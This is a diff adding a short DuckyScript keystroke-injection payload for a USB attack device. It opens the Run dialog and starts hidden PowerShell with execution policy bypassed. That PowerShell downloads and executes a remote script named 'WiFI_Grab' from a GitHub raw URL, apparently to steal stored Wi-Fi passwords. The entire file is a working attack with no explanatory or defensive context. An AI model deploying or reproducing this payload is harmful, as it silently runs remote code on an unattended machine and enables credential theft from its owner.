@@ -1,0 +1,4 @@
+GUI r
+DELAY 1000
+STRING powershell -w h -NoP -NonI -Ep Bypass irm https://raw.githubusercontent.com/markyway/MWT/main/WiFI_Grab?token=GHSAT0AAAAAACIVRUU6GVPMWWBS3APO7WI4ZJMKEQQ | iex
+ENTER
